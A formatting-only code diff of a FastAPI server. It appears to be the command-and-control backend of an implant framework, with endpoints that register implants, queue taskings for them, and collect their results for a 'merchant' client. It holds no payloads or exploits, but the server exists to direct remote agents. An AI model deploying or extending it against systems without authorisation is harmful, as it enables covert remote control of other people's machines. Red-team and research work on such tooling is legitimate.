@@ -36,10 +36,13 @@ from server_helper.results_helper import (
 
 app = FastAPI()
 
+
 # for client only to be able to access protected endpoints, authentication via OAuth2
 @app.post("/token/", response_model=Token)
-def login(db: SessionLocal = Depends(get_db), # type: ignore
-          form_data: OAuth2PasswordRequestForm = Depends()):  
+def login(
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    form_data: OAuth2PasswordRequestForm = Depends(),
+):
     user_exists = (
         db.query(Users)
         .filter(
@@ -84,14 +87,16 @@ def verify_token(token: str, Depends=(oauth2_scheme)):
 
 # PROTECTED endpoint to view all information about all users
 @app.get("/users", response_model=List[UserRead])
-def read_users(db: SessionLocal = Depends(get_db), # type: ignore
-               token: str = Security(oauth2_scheme)):  
-    '''
+def read_users(
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     Provide all the users that exist in the users table
     :param db: The active db connection
     :param token: The jwt authentication token provided during authentication
     :return users: The users from the user table in json format
-    '''
+    """
     verify_token(token)
     users = db.query(Users).all()
     return users
@@ -99,14 +104,17 @@ def read_users(db: SessionLocal = Depends(get_db), # type: ignore
 
 # PROTECTED endpoint to view all information about a user
 @app.get("/users/{user_id}", response_model=UserRead)
-def read_user(user_id: int, db: SessionLocal = Depends(get_db), # type: ignore
-              token: str = Security(oauth2_scheme)):  
-    '''
+def read_user(
+    user_id: int,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     Provide specific user by id that may or may not exist in the users table
     :param db: The active db connection
     :param token: The jwt authentication token provided during authentication
     :return user: The requested user or a 404 code
-    '''
+    """
     verify_token(token)
     user = db.query(Users).filter(Users.id == user_id).first()
     if user is None:
@@ -116,15 +124,18 @@ def read_user(user_id: int, db: SessionLocal = Depends(get_db), # type: ignore
 
 # PROTECTED endpoint to create a new user
 @app.post("/users/create", response_model=UserCreate)
-def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), # type: ignore
-                token: str = Security(oauth2_scheme)):  
-    '''
+def create_user(
+    user: UserCreate,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     Create a user in the users table via username and password
     :param user: The user to create via username and password
     :param db: The active db connection
     :param token: The jwt authentication token provided during authentication
     :return db_user: The users information that was added to the users table or a 400 status code
-    '''
+    """
     verify_token(token)
     existing_user = db.query(Users).filter(Users.username == user.username).first()
     if existing_user:
@@ -139,15 +150,18 @@ def create_user(user: UserCreate, db: SessionLocal = Depends(get_db), # type: ig
 
 # PROTECTED endpoint to delete a user
 @app.delete("/users/delete/{user_id}", response_model=UserDelete)
-def delete_user(user_id: int, db: SessionLocal = Depends(get_db), # type: ignore
-                token: str = Security(oauth2_scheme)):  
-    '''
+def delete_user(
+    user_id: int,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     The user to delete from the users table by ID
     :param user_id: The user id to attempt to remove from the users table
     :param db: The active db connection
     :param token: The jwt authentication token provided during authentication
     :return UserDelete: The user to delete from the users table, or 404 status code
-    '''
+    """
     verify_token(token)
     db_user = db.query(Users).filter(Users.id == user_id).first()
     if db_user is None:
@@ -159,16 +173,20 @@ def delete_user(user_id: int, db: SessionLocal = Depends(get_db), # type: ignore
 
 # PROTECTED endpoint for clients to retrieve result based on session id and tasking id
 @app.get("/results/{session}/{id}", response_model=ResultsRead)
-def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), # type: ignore
-                token: str = Security(oauth2_scheme)):  
-    '''
+def read_result(
+    session: str,
+    id: int,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     Provide results of a tasking to the merchant client.
     :param session: The session id of the agent to retrieve tasking
     :param id: The id of the tasking that merchant wants results for
     :param db: The connection to the database
     :param token: The jwt authentication token used to auth to lighthouse
     :return db_result: The result of the tasking provided back in json format
-    '''
+    """
     verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
@@ -176,8 +194,9 @@ def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), # typ
     db_result = (
         # this was a bad bug
         # db.query(Results).filter(Results.session == session, Results.id == id).first()
-        db.query(Results).filter(Results.session == session, Results.tasking_id == id).first()
-
+        db.query(Results)
+        .filter(Results.session == session, Results.tasking_id == id)
+        .first()
     )
     if db_result is None:
         raise HTTPException(status_code=416, detail="Result out of range")
@@ -186,17 +205,17 @@ def read_result(session: str, id: int, db: SessionLocal = Depends(get_db), # typ
 
 # recieve tasking output from agent based on session id, marks task complete = True
 @app.post("/results/{session}", response_model=ResultsCreate)
-def create_results(session: str, 
-                   results: ResultsCreate, 
-                   db: SessionLocal = Depends(get_db)):  # type: ignore
-    '''
+def create_results(
+    session: str, results: ResultsCreate, db: SessionLocal = Depends(get_db)
+):  # type: ignore
+    """
     The endpoint where agents will send result output back to the lighthouse server
     :param session: The session id tied to the results being sent
     :param results: The results of the provided tasking
     :param db: The db connection to the sqlite database
     :return db_task: The successful tasking result or 404 if the session is not found
     or 400 if the results are not properly formatted
-    '''
+    """
     current_time = datetime.now(timezone.utc).isoformat()
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
@@ -234,18 +253,21 @@ def create_results(session: str,
 
 # PROTECTED endpoint in order to create a task for an implant (client -> server)
 @app.post("/tasking/{session}", response_model=TaskingCreate)
-def create_tasking(session: str, tasking: TaskingCreate, db: 
-                   SessionLocal = Depends(get_db), # type: ignore
-                   token: str = Security(oauth2_scheme)):  
-    '''
+def create_tasking(
+    session: str,
+    tasking: TaskingCreate,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
+    """
     The endpoint where merchant will submit tasking requests to lighthouse for the agent to pick up and action
     :param session: The session id we should associate with for the tasking request
     :param tasking: The json blob containing the valid tasking request
     :param db: The active database connection
     :param token: The token used to authenticate a merchant to lighthouse
-    :return db_task: The json tasking information, 404 if the session is not found, 400 if the 
+    :return db_task: The json tasking information, 404 if the session is not found, 400 if the
     arguments are not valid for the tasking request
-    '''
+    """
     verify_token(token)
     current_time = datetime.now(timezone.utc).isoformat()
     # Check if the session exists
@@ -278,9 +300,11 @@ def create_tasking(session: str, tasking: TaskingCreate, db:
 
 # PROTECTED endpoint for client to retrieve taskings
 @app.get("/tasking/{session}", response_model=List[TaskingRead])
-def read_taskings(session: str, 
-                  db: SessionLocal = Depends(get_db), # type: ignore
-                  token: str = Security(oauth2_scheme)):  
+def read_taskings(
+    session: str,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
     verify_token(token)
     db_implant = db.query(Implant).filter(Implant.session == session).first()
     if not db_implant:
@@ -320,8 +344,10 @@ def create_implant(implant: ImplantCreate, db: SessionLocal = Depends(get_db)): 
 
 # PROTECTED endpoint for clients only to be able to view all implants
 @app.get("/implants/", response_model=List[ImplantRead])
-def read_implants(db: SessionLocal = Depends(get_db), # type: ignore
-                  token: str = Security(oauth2_scheme)):  
+def read_implants(
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
     verify_token(token)
     implants = db.query(Implant).all()
     return implants
@@ -329,9 +355,11 @@ def read_implants(db: SessionLocal = Depends(get_db), # type: ignore
 
 # PROTECTED endpoint for clients to be able to view a single implant by session
 @app.get("/implants/{session}", response_model=ImplantRead)
-def read_single_implant(session: str, 
-                        db: SessionLocal = Depends(get_db), # type: ignore
-                        token: str = Security(oauth2_scheme)):  
+def read_single_implant(
+    session: str,
+    db: SessionLocal = Depends(get_db),  # type: ignore
+    token: str = Security(oauth2_scheme),
+):
     verify_token(token)
     implant = db.query(Implant).filter(Implant.session == session).first()
     if implant is None:
